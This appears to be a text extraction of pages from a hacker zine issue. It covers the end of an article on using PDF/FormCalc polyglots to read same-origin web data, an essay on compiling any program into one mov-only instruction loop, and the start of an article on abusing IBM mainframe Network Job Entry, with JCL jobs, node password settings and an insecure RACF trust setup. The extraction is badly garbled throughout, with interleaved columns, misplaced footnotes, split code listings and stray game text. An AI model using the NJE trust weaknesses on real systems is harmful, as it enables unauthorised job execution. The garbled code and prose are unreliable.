ded Flash or FormCalc. Note that in this scenario
we assume that the injection is unconstrained when
it comes to the character set, so there’s no need to
avoid newlines or other characters. This only works
in HTML pages that don’t have a <!doctype dec-
laration, since that is included in Adobe Reader’s
blacklist of strings that can’t appear before the PDF
header in a PDF file. Adobe Reader simply refuses
to display these files, so the applicability of this at-
tack is very limited.
Modern browsers block popups by default. This
protection can be bypassed basically in all browsers
running the Adobe Reader plugin by using the
app.launchURL("URL", true) JavaScript API.
Last, but not least, we’ve run into many Adobe
Reader memory corruption errors during our re-
search. This indicates that the features we’ve tested
are not widely used and fuzzed, so they might be a
good target for future fuzzing projects.
4.5.1
instrumented externally, so it was a natural fit for
Rosetta Flash-style exploitation.
Following Alex’s proof of concept in 2015, 16
@irsdl demonstrated a way of instrumenting the
FormCalc script from the embedding, attacker-
controlled page. 18 The abovementioned served as a
starting point for the Comma Chameleon research.
Comma Chameleon is part of a larger research
initiative focused on modern MIME sniffing and as
such was done with help of Claudio Criscione, Sebas-
tian Lekies, Michele Spagnuolo, and Stephan Pfist-
ner.
Throughout the research, we’ve used multiple
PDF parser quirks demonstrated by Ange Albertini
in his Corkami project. 31
We’d like to thank all of the above!
Acknowledgments and Related Work
No research is done in a vacuum; Comma
Chameleon was only possible because of prior re-
search, inspiration, and collaboration with others in
the community.
Using the PDF format for extracting same
origin resources was first researched by Vladimir
Vorontsov. 29 Alex Inführ later presented various
vulnerabilities in Adobe Reader. 30
Vladimir and Alex demonstrated that PDF files
could embed the scripts in the simple calculation
language, FormCalc, to issue HTTP requests to
same-origin URLs and read the responses. This re-
quires no confirmation from the user and can be
29 Vladimir
Vorontsov, SDRF Vulnerability in Web Applications and Browsers
Inführ, PDF — Mess With the Web
31 git clone https://github.com/angea/corkami
30 Alex
26275
A Crisis of Existential Import; or,
Putting the VM in M/o/Vfuscator
by Chris Domas
mov
loop:
mov
mov
add
mov
mov
mov
add
mov
add
jmp
esi, offset ops
ebx, [esi]
ebx, [ebx]
ebx, [esi+4]
ebx, [ebx]
edx, [esi+8]
edx, [edx]
edx, [esi+0Ch]
[edx], ebx
esi, 10h
short loop
AES
mov
loop:
mov
mov
add
mov
mov
mov
add
mov
add
jmp
esi, offset ops
ity is unique to x86, and it could be argued that the
MMU is then performing the calculations, even if
the processor core is not—different calculations are
being performed for different programs, they are just
being performed “elsewhere.”
Instead, we demonstrate that all programs, on
any architecture, could be simplified to a single,
universal instruction stream, in which the compu-
tations performed are precisely equivalent for every
program—if we look only at the instructions, rather
than their data.
In our proof of concept, we will illustrate reduc-
ing any C program to the same instruction stream on
the x86 architecture. It should be straightforward to
understand the adaptation to other languages and
architectures.
We begin the reduction with a rather ridiculous
tool called the M/o/Vfuscator. The M/o/Vfusca-
tor allows us to compile any C program into only
x86 mov instructions. That is not to say the in-
structions are all the same—the registers, operands,
addressing modes, and access sizes vary depending
on the program—but the instructions are all of the
mov variety. What would be the point of such a
thing? Nothing at all, but it does provide a useful
beginning for us—by compiling programs into only
mov instructions, we greatly simplify the instruc-
tion stream, making further reduction feasible. The
mov instructions are executed in a continuous loop,
and compiling a program 34 produces an instruction
stream as follows:
ebx, [esi]
ebx, [ebx]
ebx, [esi+4]
ebx, [ebx]
edx, [esi+8]
edx, [edx]
edx, [esi+0Ch]
[edx], ebx
esi, 10h
short loop
Minesweeper
A programmer writes code. That is his purpose:
to define the sequence of instructions that must be
carried out to perform a desired action. Without
code, he serves no purpose, fulfills no need. What
then would be the effect on our existential selves if
we found that all code was the same, that every pro-
gram could be written and executed exactly as every
other? What if the net result of our century of work
was precisely . . . nothing?
Here, we demonstrate that all programs, on all
architectures, 32 can be reduced to the same instruc-
tion stream; that is, the sequence of instructions
executed by the processor can be made identical
for every program. On careful analysis, it is nec-
essary to observe that this is subtly distinct from
prior classes of research. In an interpreter, we might
say that the same instructions (those that compose
the VM) can execute multiple programs, and this is
correct; however, in an interpreter the sequence of
the instructions executed by the processor changes
depending on the program being executed—that is,
the instruction streams differ. Alternatively, we note
that it has been shown that the x86 MMU is itself
Turing-complete, allowing a program to run with no
instructions at all. 33
In this sense, on x86, we could argue that any
program, compiled appropriately, could be reduced
to no instructions—thereby inducing an equivalence
in their instruction streams. However, this peculiar-
1 start :
mov . . .
3 mov . . .
mov . . .
5 ...
mov . . .
7 mov . . .
mov . . .
9 jmp s t a r t
32 Perhaps
it is necessary to specify, Turing-complete architecture.
The Page-Fault Weird Machine: Lessons in Instruction-less Computation by Julian Bangert et al., USENIX WOOT’13
or the 29C3 talk “The Page Fault Liberation Army or Gained in Translation” by Bangert & Bratus
34 movcc -Wf–no-mov-loop program.c -o program
33 See
28But our mov instructions are of all varieties—
from simple mov eax, edx to complex mov dl,
[esi+4*ecx+0x19afc09], and everything in be-
tween. Many architectures will not support such
complex addressing modes (in any instruction), so
we further simplify the instruction stream to pro-
duce a uniform variety of movs. Our immediate goal
is to convert the diverse x86 movs to a simple, 4-byte,
indexed addressing varieties, using as few registers
as possible. This will simplify the instruction stream
for further processing and mimic the simple load and
store operations found on RISC type architectures.
As an example, let us assume 0x10000 is a 4-byte
scratch location, and esi is kept at 0. Then
1 mov eax , edx
can be converted to
1 mov [ 0 x10000+e s i ] , edx
mov eax , [ 0 x10000+e s i ]
We have replaced the register-to-register mov va-
riety with a standard 4-byte indexed memory read
and write. Similarly, if we pad our data so that an
oversized memory read will not fault, and pad our
scratch space to allow writes to spill, then
mov a l , [ 0 x20000 ]
can be rewritten
1 mov
mov
3 mov
mov
[ 0 x10000+e s i ] , eax
e d i , [ 0 x20000−3+ e s i ]
[ 0 x10000−3+ e s i ] , e d i
eax , [ 0 x10000+e s i ]
For more complex addressing forms, such as mov
dx, [eax+4*ebx+0xdeadbeef], we break out the
extra bit shift and addition using the same technique
the M/o/Vfuscator uses—a series of movs to perform
the shift and sum, allowing us to accumulate (in the
example) eax+4*ebx into a single register, so that
the mov can be reduced back to an indexed address-
ing eax+0xdeadbeef.
With such transforms, we are able to rewrite our
diverse-mov program so that all reads are of the form
mov esi/edi, [base + esi/edi] and all writes of
the form mov [base + esi/edi], esi/edi, where
29base is some fixed address. By inserting dummy
reads and writes, we further homogenize the instruc-
tion stream so that it consists only of alternating
reads and writes. Our program now appears as (for
example):
start :
2 ...
mov e s i , [ 0 x149823 +
4 mov [ 0 x 9 f b a 0 9 + e s i ] ,
mov e d i , [ 0 x401ab5 +
6 mov [ 0 x 3 7 1 9 f f + e s i ] ,
...
8 jmp s t a r t
{ 0 , _esi ,
2 {0 x9fba09
{ 0 , _edi ,
4 {0 x 3 7 1 9 f f
edi ]
esi
edi ]
edi
operands :
2 . long 0 , _esi ,
. long 0 x9fba09
4 . long 0 , _edi ,
. long 0 x 3 7 1 9 f f
start :
2 ...
MOVE [ _ e s i ] , [ 0 x149823 + [ _edi ] ]
4 MOVE [ 0 x 9 f b a 0 9 + [ _ e s i ] ] , [ _ e s i ]
MOVE [ _edi ] , [ 0 x401ab5 + [ _edi ] ]
6 MOVE [ 0 x 3 7 1 9 f f + [ _ e s i ] ] , [ _edi ]
...
8 jmp s t a r t
where _esi and _edi are labels on 4-byte mem-
ory locations, and MOVE is a pseudo-instruction, ca-
pable of accessing multiple memory addresses. With
the freedom of the pseudo-instruction MOVE, we can
simplify all instructions to have the exact same form:
, [ 0 x149823
[ _esi ] ] , [ 0
, [ 0 x401ab5
[ _esi ] ] , [ 0
0 x149823 ,
, _esi , 0 ,
0 x401ab5 ,
, _esi , 0 ,
_edi }
_esi }
_edi }
_edi }
and write this as a list of operands:
The only variation is in the choice of register and
the base address in each instruction. This simplifica-
tion in the instruction stream now allows us to more
easily apply additional transforms to the code. In
this case, it enables writing a non-branching mov in-
terpreter. We first envision each mov as accessing
“virtual,” memory-based registers, rather than CPU
registers. This allows us to treat registers as sim-
ple addresses, rather than writing logic to select be-
tween different registers. In this sense, the program
is now
start :
2 ...
MOVE [ 0 + [ _ e s i ] ]
4 MOVE [ 0 x 9 f b a 0 9 +
MOVE [ 0 + [ _edi ] ]
6 MOVE [ 0 x 3 7 1 9 f f +
...
8 jmp s t a r t
We can now define each MOVE by its tuple of
memory addresses:
+
+
+
+
[ _edi
[ _esi
[ _edi
[ _edi
0 x149823 ,
, _esi , 0 ,
0 x401ab5 ,
, _esi , 0 ,
_edi
_esi
_edi
_edi
We now write an interpreter for our pseudo-mov.
Let us assume the physical esi register now holds
the address of a tuple to execute:
1 ; a pseudo−move
3 ; Read t h e data from
mov ebx , [ e s i +0]
;
5
;
mov ebx , [ ebx ]
;
7
;
add ebx , [ e s i +4]
;
9
;
;
11
;
mov ebx , [ ebx ]
;
13
;
the source .
Read t h e a d d r e s s o f t h e
v i r t u a l index r e g i s t e r .
Read t h e v i r t u a l i n d e x
register .
Add t h e o f f s e t and
index r e g i s t e r s to
compute a s o u r c e
address .
Read t h e data from t h e
computed a d d r e s s .
15 ; Write t h e data t o t h e d e s t i n a t i o n .
mov edx , [ e s i +8]
; Read t h e a d d r e s s o f t h e
17
; v i r t u a l index r e g i s t e r .
mov edx , [ edx ]
; Read t h e v i r t u a l i n d e x
19
; register .
add edx , [ e s i +12]
; Add t h e o f f s e t and
21
; index r e g i s t e r s to
; compute a d e s t i n a t i o n
23
; address .
mov [ edx ] , ebx
; Write t h e data t o t h e
25
; destination address .
]]
]]
]]
]]
30Finally, we execute this single MOVE interpreter
in an infinite loop. To each tuple in the operand
list, we append the address of the next tuple to ex-
ecute, so that esi (the tuple pointer) can be loaded
with the address of the next tuple at the end of each
transfer iteration. This creates the final system:
1 mov e s i , o p e r a n d s
loop :
3 mov ebx , [ e s i +0]
mov ebx , [ ebx ]
5 add ebx , [ e s i +4]
mov ebx , [ ebx ]
7 mov edx , [ e s i +8]
mov edx , [ edx ]
9 add edx , [ e s i +12]
mov [ edx ] , ebx
11 mov e s i , [ e s i +16]
jmp l o o p
The operand list is generated by the compiler,
and the single universal program appended to it.
With this, we can compile all C programs down to
this exact instruction stream. The instructions are
simple, permitting easy adaptation to other archi-
tectures. There are no branches in the code, so the
precise sequence of instructions executed by the pro-
cessor is the same for all programs. The logic of
the program is effectively distilled to a list of mem-
ory addresses, unceremoniously processed by a mun-
dane, endless data transfer loop.
So, what does this mean for us? Of course, not so
much. It is true, all “code” can be made equivalent,
and if our job is to code, then our job is not so inter-
esting. But the essence of our program remains—it
had just been removed from the processor, diffused
instead into a list of memory addresses. So rather,
I suppose, that when all logic is distilled to noth-
ing, and execution has lost all meaning—well, then,
a programmer’s job is no longer to “code,” but rather
to “data!”
This project, and the proof of concept reduc-
ing compiler, can be found at Github 35 and as an
attachment. 36 The full code elaborates on the pro-
cess shown here, to allow linking reduced and non-
reduced code. Examples of AES and Minesweeper
running with identical instructions are included.
35 git
clone https://github.com/xoreaxeaxeax/reducto
pocorgtfo12.pdf reducto.tgz
36 unzip
316
A JCL Adventure with Network Job Entries
by Soldier of Fortran
Mainframes. Long the cyberpunk mainstay of
expert hackers, they have spent the last 30 years in
relative obscurity within the hallowed halls of hack-
ers/crackers. But no longer! There are many ways
to break into mainframes, and this article will out-
line one of the most secret components hushed up
within the dark corners of mainframe mailing lists:
Network Job Entry (NJE). the world as z/OS.
z/OS is composed of many different components
that this article doesn’t have the time to get in to,
but trust me when I say there are thousands of
pages to be read out there about using and oper-
ating z/OS. A brief overview, however, is needed to
understand how NJE (Network Job Entry) works,
and what you can do with it.
6.1 6.1.1
Operating System and Interac-
tion
Time Sharing and UNIX
You need a way to interact with z/OS. There are
many different ways, but I’m going to outline two
here: OMVS and TSO.
OMVS is the easiest, because it’s really just
UNIX. In fact, you’ll often hear USS, or Unix Sys-
tem Services, mentioned instead of OMVS. For the
curious, OMVS stands for Open MVS; (MVS stands
for Multiple Virtual Storage, but I’ll save virtual
storage for its own article.) Shown in Figure 6,
OMVS is easy—because it’s UNIX, and thus uses
familiar UNIX commands.
TSO is just as easy as OMVS—when you under-
stand that it is essentially a command prompt with
commands you’ve never seen or used before. TSO
stands for Time Sharing Option. Prior to the com-
mon era, mainframes were single-use—you’d have a
With the advent of the mainframe, IBM really had a
winner on their hands: one of the first multipurpose
computers that could serve multiple different activ-
ities on the same hardware. Prior to OS/360, you
only had single-purpose computers. For example,
you’d get a machine that helps you track inventory
at all your stores. It worked so well that you figured
you wanted to use it to process your payroll. No
can do, you needed a separate bespoke system for
that. Enter IBMs OS/360, and, from large to small,
you had a system that was multipurpose but could
also scale as your needs did. It made IBM billions,
which was good because it almost cost the company
its very existence. OS/360 was released in 1964 and
(though re-written entirely today) still exists around
Network Job Entry
NJHTOUSER = H4CKR
32stack of cards and have a set time to input them and
wait for the output. Two people couldn’t run their
programs at the same time. Eventually, though, it
became possible to share the time on a mainframe
with multiple people. This option to share time was
developed in the early 70s and was optional until
1974. Figure 7 shows the same commands as in Fig-
ure 6, but this time in TSO.
6.1.2
Datasets and Members;
Data
1 l i s t d s ’ dade . example ’ members
DADE.EXAMPLE
3 −−RECFM −LRECL −BLKSIZE− DSORG
FB
80
27920
PO
5 −−VOLUMES −−
PUBLIC
7 −−MEMBERS −−
MANIFEST
9 PHRACK
Files and
Here we can see that the file EXAMPLE was in
fact a folder that contained the files MANIFEST and
PHRACK. Of course this would be too easy if they
just called it “files” and “folders” (what we’re all used
to)—but no, these are called datasets and members.
Another thing you may be noticing now is that
there seem to be dots instead of slashes to denote
folders/files hierarchy. It’s natural to assume—if
you don’t use mainframes—that the nice comforting
notion of a hierarchy carries over with some min-
imal changes—but you’d be wrong. z/OS doesn’t
really have the concept of a folder hierarchy. The
files dade.file1.g2 and dade.file2.g2 are sim-
ply named this way for convenience. The locations,
on disk, of various datasets, etc. are controlled by
the system catalogue—which is another topic to save
away for a future article. Regardless, those dots do
serve a purpose and have specific names. The text
before the first dot is called a High Level Qualifier, or
HLQ. This convention allows security products the
ability to provide access to clusters of datasets based
In the examples above you had a little taste of
the file system on z/OS. UNIX (or OMVS) looks
and feels like UNIX, and it’s a core component of
the operating system. However, its file system re-
sides within what we call a dataset. Datasets are
what z/OS people would refer to as files/folders. A
dataset can be a file or folder composed of either
fixed-length or variable-length data. 37 You can also
create what is called a PDS or Partitioned DataSet:
what you or I would call a folder. Let’s take a look
at the TSO command listds again, but this time
we’ll pass it the parameter members.
37 Mainframe
experts, this is a very high level discussion. Please don’t beat me up about various dataset types!
MAINTENANCE ROOM
THIS IS WHAT APPEARS TO HAVE BEEN THE MAINTENANCE ROOM FOR FLOOD CONTROL DAM #3.
APPARENTLY, THIS ROOM HAS BEEN RANSACKED RECENTLY, FOR MOST OF THE VALUABLE EQUIPMENT IS
GONE. ON THE WALL IN FRONT OF YOU IS A GROUP OF BUTTONS, WHICH ARE LABELLED IN EBCDIC.
33> l s − l
2 t o t a l 32
−rw−r−−r−−
1 MARGO
SYS1
596 Mar 9 1 3 : 0 8 m a n i f e s t
4 −rw−r−−r−−
1 MARGO
SYS1
1494 Mar 9 1 3 : 0 9 phrack . t x t
> cat manifest
6 This i s our world now . . . t h e world o f t h e e l e c t r o n and t h e switch , t h e
beauty o f t h e baud . We make u s e o f a s e r v i c e a l r e a d y e x i s t i n g w i t h o u t p a y i n g
8 f o r what c o u l d be d i r t −cheap i f i t wasn ’ t run by p r o f i t e e r i n g g l u t t o n s , and
you c a l l us c r i m i n a l s . We e x p l o r e . . . and you c a l l us c r i m i n a l s . We s e e k
10 a f t e r knowledge . . . and you c a l l us c r i m i n a l s . We e x i s t w i t h o u t s k i n c o l o r ,
w i t h o u t n a t i o n a l i t y , w i t h o u t r e l i g i o u s b i a s . . . and you c a l l us c r i m i n a l s .
12 You b u i l d at om ic bombs , you wage wars , you murder , c h e a t , and l i e t o us
and t r y t o make us b e l i e v e i t ’ s f o r our own good , y e t we ’ r e t h e c r i m i n a l s .
14 > c a t "// ’DADE.EXAMPLE( phrack ) ’ "
16
22 _ _
_______
| \/ |
/ _____/
|_ | | _| e t a l / / hop
_________/ /
/__________/
( 3 1 4 ) 432 −0756
24 Hours A Day , 300/1200 Baud
24 Presents . . . .
18
20
26
==Phrack I n c .==
Volume One , I s s u e One , P h i l e 1 o f 8
28
Introduction . . .
30 > n e t s t a t
MVS TCP/ IP NETSTAT CS V3R5
32 User I d Conn
Local Socket
−−−−−−− −−−−
−−−−−−−−−−−−
34 TN3270
0000000B 0 . 0 . 0 . 0 . . 2 3
TCPIP Name : TCPIP
Foreign Socket
−−−−−−−−−−−−−−
0.0.0.0..0
Figure 6 – OMVS
34
13:16:16
State
−−−−−
ListenREADY
2 l i s t d s example
DADE.EXAMPLE
4 −−RECFM −LRECL −BLKSIZE− DSORG
FB
80
27920
PO
6 −−VOLUMES −−
PUBLIC
8 e d i t ’ dade . example ( m a n i f e s t ) ’ t e x t
IKJ52338I DATA SET ’DADE.EXAMPLE(MANIFEST) ’ NOT LINE NUMBERED, USING NONUM
10 EDIT
list
12 This i s our world now . . . t h e world o f t h e e l e c t r o n and t h e switch , t h e
beauty o f t h e baud . We make u s e o f a s e r v i c e a l r e a d y e x i s t i n g w i t h o u t p a y i n g
14 f o r what c o u l d be d i r t −cheap i f i t wasn ’ t run by p r o f i t e e r i n g g l u t t o n s , and
you c a l l us c r i m i n a l s . We e x p l o r e . . . and you c a l l us c r i m i n a l s . We s e e k
16 a f t e r knowledge . . . and you c a l l us c r i m i n a l s . We e x i s t w i t h o u t s k i n c o l o r ,
w i t h o u t n a t i o n a l i t y , w i t h o u t r e l i g i o u s b i a s . . . and you c a l l us c r i m i n a l s .
18 You b u i l d at om ic bombs , you wage wars , you murder , c h e a t , and l i e t o us
and t r y t o make us b e l i e v e i t ’ s f o r our own good , y e t we ’ r e t h e c r i m i n a l s .
20 IKJ52500I END OF DATA
end
22 READY
netstat
24 EZZ2350I MVS TCP/ IP NETSTAT CS V3R5
TCPIP Name : TCPIP
18:23:42
EZZ2585I User I d Conn
Local Socket
Foreign Socket
State
26 EZZ2586I −−−−−−− −−−−
−−−−−−−−−−−−
−−−−−−−−−−−−−−
−−−−−
EZZ2587I TN3270
0000000B 0 . 0 . 0 . 0 . . 2 3
0.0.0.0..0
Listen
listds lists a dataset. This command is similar to ls.
edit ’dade.example(manifest)’ text/list lists the contents of a file.
netstat is good ol’ netstat.
Figure 7 – TSO
35on the HLQ. The other ‘levels’ also have names, but
we can just call them qualifiers and move on. For
example, in the listds example above we wanted
to see the members of the file DADE.EXAMPLE
where the HLQ is DADE.
6.1.3
tions we wish to pass to BPXBATCH (PARM stands
for parameters). It takes UNIX commands as its
options and executes them in UNIX. In our exam-
ple, it’s catting the file example/manifest and dis-
playing the current IP configuration with netstat
home. If you ran this JCL, it would cat the file
/dade/example/manifest, execute netstat home,
and print any output to STDOUT, which really means
it will print it to the log of your job activities.
If, instead of using UNIX commands, you wanted
to execute TSO commands, you could use IK-
JEFT01, as in Figure 9.
Jobs and Languages
Now that you understand a little about the file sys-
tem and the command interfaces, it is time to in-
troduce JES2 and JCL. JES2, or Job Entry Subsys-
tem v2, is used to control batch operations. What
are batch operations? Simply put, these are auto-
mated commands/actions that are taken program-
matically. Let’s say you’re McDonalds and need to
process invoices for all the stores and print the re-
sults. The invoice data is stored in a dataset, you do
some work on that data, and print out the results.
You’d use multiple different programs to do that, so
you write up a script that does this work for you.
In z/OS we’d refer to the work being performed as
a job, and the script would be referred to as JCL, or
Job Control Language.
There are many options and intricacies of JCL
and of using JCL, and I won’t be going over those.
Instead, I’m going to show you a few examples and
explain the components.
In Figure 8 is a very simple JCL file. In JCL
each line starts with a //. This is required for every
line that’s not parameters or data being passed to
a program. The first line is known as the job card.
Every JCL file starts with it. In our example, the
NAME of the job is USSINFO, then comes the TYPE
(JOB) followed by the job name (JOBNAME) and
programs exec cat and netstat. The remaining
items can be understood by reading documentation
and tutorials. 38
Next we have the STEP. We give each job step
a name. In our example, we gave the first step
the name UNIXCMD. This step executes the program
BPXBATCH.
What the hell is BPXBATCH? Essentially, all UNIX
programs, commands, etc., start with BPX. In our
JCL, BPXBATCH means “UNIX BATCH”, which is ex-
actly what this program is doing. It’s executing
commands in UNIX through JES as a batch process.
So, using JCL we EXECute the ProGraM BPXBATCH:
EXEC PGM=BPXBATCH
Skipping STDIN and STDOUT (it means just use
the defaults) we get to STDPARM. These are the op-
6.1.4
Security
You need to understand that OS/360 didn’t really
come with security, and it wasn’t until SHARE in
1974 that the decision to create security products
for the mainframe was made. IBM didn’t release the
first security product for the mainframe until 1976.
Later, competing products would be released, specif-
ically ACF2 in 1978 and Top Secret sometime after
that. IBM’s security product was RACF, or Re-
source Access Control Facility, and is what is com-
monly referred to as a SAF, or Security Access Fa-
cility (ACF2/Top Secret are also SAFs).
Within RACF you have classes and permissions.
You can create users, assign groups. You get what
you’d expect from modern identity managers, but
it’s very arcane and the command syntax makes no
sense. For example, to add a user the command is
ADDUSER:
1 ADDUSER ZER0KUL NAME( ’ Dade Murphy ’ ) TSO(TSO(
ACCTNUM( E133T3 ) PROC(STARTUP) ) (OMVS(UID
( 3 1 3 3 7 ) HOME( / u/ZER0KUL) PROGRAM( / b i n /
t c s h ) ) DFLTGRP(SYSOM) OWNER(SYSADM)
Adding a group is similar. Luckily, as with all
things, z/OS IBM has really good documentation
on how to use RACF.
The key thing to know is that RACF is one huge
database stored as data within a dataset. (You can
see the location by typing RVARY.)
6.1.5
Networking
Mainframes run a full TCP/IP stack. This shouldn’t
really come as a shock, as you saw NETSTAT above!
TCP/IP has been available since the 80s on z/OS
38 http://www.tutorialspoint.com/jcl/jcl_job_statement.htm
361 //USSINFO JOB (JOBNAME) , ’ e x e c c a t and n e t s t a t ’ ,CLASS=A,
//
MSGLEVEL=(0 ,0) ,MSGCLASS=K,NOTIFY=&SYSUID
3 //UNIXCMD EXEC PGM=BPXBATCH
// ∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗∗ ∗
5 // ∗ JCL t o g e t sy s te m i n f o
// ∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗∗ ∗
7 //STDIN
DD SYSOUT=∗
//STDOUT
DD SYSOUT=∗
9 //STDPARM
DD ∗
sh c a t example / m a n i f e s t ; n e t s t a t home
11 /∗
Figure 8 – Simple JCL file
1 //TSOINFO JOB (JOBNAME) , ’ e x e c n e t s t a t ’ ,CLASS=A,
//
MSGLEVEL=(0 ,0) ,MSGCLASS=K,NOTIFY=&SYSUID
3 //TSOCMD
EXEC PGM=IKJEFT01
//SYSTSPRT DD
SYSOUT=∗
5 //SYSOUT
DD
SYSOUT=∗
//SYSTSIN DD
∗
7
LISTDS ’DADE.EXAMPLE ’ MEMBERS
NETSTAT HOME
9 /∗
Figure 9 – IKJEFT01 for executing TSO commands.
and has slowly replaced SNA (System Network Ar-
chitecture, a crazy story beyond the scope of this
article). cause z/OS is so configurable that you can put these
configuration files anywhere. Likely, however, you’ll
find it in SYS1.TCPPARMS (a PDS).
TCP/IP is configured in a parmlib. I’m being
vague here, not to protect the innocent, but be- So, we’ve got TCP/IP configured and ready to
go, and we understand that a lot of a mainframe’s
MACHINE ROOM
THIS IS A LARGE ROOM FULL OF ASSORTED HEAVY MACHINERY, WHIRRING NOISILY. THE ROOM SMELLS
OF BURNED RESISTORS. ALONG ONE WALL ARE THREE BUTTONS WHICH ARE, RESPECTIVELY, ROUND,
TRIANGULAR, AND SQUARE. NATURALLY, ABOVE THESE BUTTONS ARE INSTRUCTIONS WRITTEN IN
EBCDIC...
37power comes from batch processing. So far so good.
6.2
Network Job Entry
Understand that mainframes are expensive. Very
expensive. When you buy one, you’re not in it for
the short term. But, say you’re an enterprise in the
80s and have a huge printing facility designed to
print checks in New Mexico. You buy a mainframe
to handle all the batch processing of those printers
and keep track of what was printed where and when.
Unfortunately, the data needed for those checks is
kept in a system in Ohio, and only the system in
Idaho knows when it’s ready to kick off new print
jobs automatically. Enter Network Job Entry.
Using Network Job Entry (or NJE), you can sub-
mit a job in one environment, say the Idaho main-
frame POTATO, and have it execute the JCL on a
different system, for example the New Mexico main-
frame CACTUS.
1 //USSINFO JOB (JOBNAME) , ’ e x e c i d on p o t a t o
’ ,CLASS=A,
//
MSGLEVEL=(0 ,0) ,MSGCLASS=K,
NOTIFY=&SYSUID
3 /∗XEQ
POTATO
//UNIXCMD EXEC PGM=BPXBATCH
5 //STDIN
DD SYSOUT=∗
//STDOUT
DD SYSOUT=∗
7 //STDPARM DD ∗
sh i d
9 /∗
The new line “/*XEQ POTATO” tells JES2 we’d
like to execute this on POTATO, instead of our lo-
cal system.
Within NJE these systems are referred to as
nodes in a trusted network of mainframes.
6.2.1
JCL
The Setup
NJE can use SNA, but most companies use TCP/IP
for their NJE setup today. Configuring NJE requires
a few things before you get started. First, you’ll
need the IP addresses for the systems in your NJE
network, then you need to assign names to each sys-
tem (these can be different than hostnames), then
you turn it all on and watch the magic happen.
You’ll need to know all the nodes before you set
this up; you can’t just connect to a running NJE
server without it being defined.
Let’s use our example from before:
System
Name
IP
System 1 POTATO 10.10.10.1
System 2 CACTUS 10.10.10.2
Somewhere on the mainframe there will
be the JES2 startup procedures, likely in
SYS1.PARMLIB(JES2PARM), but not always. In that
file there will be a few lines to declare NJE set-
tings. The section begins with NJEDEF, where the
number of nodes and lines are declared, as well as
the number of your own node. Then, the nodes

are named, with the NODE
setting and the socket
setup with NETSRV, LINE, and SOCKET as shown in
Figure 10.
With this file you can turn on NJE with the
JES2 console command $S NETSERV1. This will en-
able NJE and open the default port, 175, waiting for
connections. To initiate the connection, you could
connect from POTATO to CACTUS with this JES2
command: $SN,LINE1,N=CACTUS, or, to go the other
way, $SN,LINE1,N=POTATO.
Potato
Cactus
An interesting property of NJE, depending on
the setup, is that in the default configuration JES2
will take the userid of the submitter and pass that
along to the target system. If that user exists on the
target system and has the appropriate permissions,
it will execute the job as that user. No password,
or tokens. How it does this is explained below in
section 4.1.
Here’s the same UNIX JCL we saw above, but
this time, instead of executing on our local system
(CACTUS), it will execute on POTATO:
386.2.2
You can also password protect NJE by adding
the PASSWORD variable on the NODE lines:
1 NODE( 1 )
NODE( 2 )
NAME=POTATO,PASSWORD=OHIO1234
NAME=CACTUS,PASSWORD=NJEROCKS
The commands, in this case, don’t change when
you connect, but a password is sent. These pass-
words don’t need to be the same, as you can see
in the example. But once you start getting five or
more nodes in a network, all with different pass-
words, managing these configs can become a pain,
so most places just use a single, shared password, if
they use passwords at all.
NJE communication can also use SSL, with a de-
fault port of 2252. If you’re not using SSL, all data
sent across the network is sent in cleartext.
With this setup we can send commands to the
other nodes by using the $N JES2 command. To dis-
play the current nodes connected to POTATO from
CACTUS, you’d enter $N 1,’$D NODE’ and get the
output:
16.54.08
2 16.54.08
4
16.54.08
6
16.54.08
8 16.54.08
10
16.54.08
The current setup will only allow NMRs to be sent
from one node to another. We need to set up trust
between these systems. Thankfully, with RACF this
is a fairly easy and painless setup. This setup can
be done with the following commands on POTATO.
Note, this is ultra insecure! Do not use this type of
setup if you are reading this. This is just an example
of what the author has seen in the wild:
1 RDEFINE RACFVARS &RACLNDE UACC(NONE)
RALTER RACFVARS &RACLNDE ADDMEM(CACTUS)
3 SETROPTS CLASSACT(RACFVARS) RACLIST(RACFVARS
)
SETROPTS RACLIST(RACFVARS) REFRESH
What this does is tell RACF that, for any job
coming in from CACTUS, POTATO can assume
that the RACF databases are the same. NJE
doesn’t actually require users to sign in or send pass-
words between nodes. Instead, as described in more
detail below, it attaches the submitting the user’s
userid from the local node and passes that informa-
tion to the node expected to perform the work. With
the above setup the local node assumes that the
RACF databases are the same (or similar enough),
and that users from one system are the same on an-
other. This isn’t always the case and can easily be
manipulated to our advantage. Thus, in our current
setup to submit work from one system to another,
the user jsmith would have to exist on both.
$HASP826 NODE( 1 )
$HASP826 NODE( 1 )
NAME=POTATO, STATUS=(OWNNODE) ,
TRANSMIT=BOTH,
$HASP826
RECEIVE=BOTH, HOLD=NONE
$HASP826 NODE( 2 )
$HASP826 NODE( 2 )
NAME=CACTUS, STATUS=(VIA/LNE1) ,
TRANSMIT=BOTH,
$HASP826 RECEIVE=BOTH, HOLD=NONE
These commands, sent with $N, are referred to
as Nodal Message Records or NMR.
System 1:
NJEDEF
NODE(1)
NODE(2)
NETSRC(1)
LINE(1)
SOCKET(CACTUS)
POTATO
NODENUM=2,
OWNNODE=1,
LINENUM=1,
NAME=POTATO
NAME=CACTUS
SOCKET=LOCAL
UNIT=TCPIP
NODE=2,
IPADDR=10.10.10.2
Nodes!
System 2:
NJEDEF
NODE(1)
NODE(2)
NETSRC(1)
LINE(1)
SOCKET(POTATO)
Figure 10 – Nodes in our network
39
CACTUS
NODENUM=2,
OWNNODE=2,
LINENUM=1
NAME=POTATO
NAME=CACTUS
SOCKET=LOCAL
UNIT=TCPIP
NODE=1,
IPADDR=10.10.10.1CKING IS
APPLE ][ CRA
ECTIONS
KILLING PROT
D5 C1 D2 40 40 40 40 40 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 01
See if you can decode what the first 3 bytes mean!
6.3.2
Once an ACK NJE packet is received, the server is
expecting a SOH/ENQ packet. 40 From this point
on, every NJE packet sent is surrounded by a TTB
and a TTR. 41 I’m sure these had acronyms at some
point, but this is no longer documented. We just
need to know that a TTB is 8 bytes long with the
third and fourth bytes being the length of the packet
plus itself. Think of the B as BLOCK. Following the
TTB is a TTR. An NJE packet can have multiple
TTRs but only one TTB. A TTR is 4 bytes long
and represents the length of the RECORD. SOH in
EBCDIC is 0x01, ENQ is 0x2D.This is what this all
looks like together:
E
AND IT ́S AWESOM
6.3
Inside NJE
With the high level discussion out of the way,
it’s time to dissect the innards of NJE, so we
can make it do what we want. Fortunately, IBM
has documented how NJE works in the document
has2a620.pdf or more commonly known as “Net-
work Job Entry Formats and Protocols.” Through-
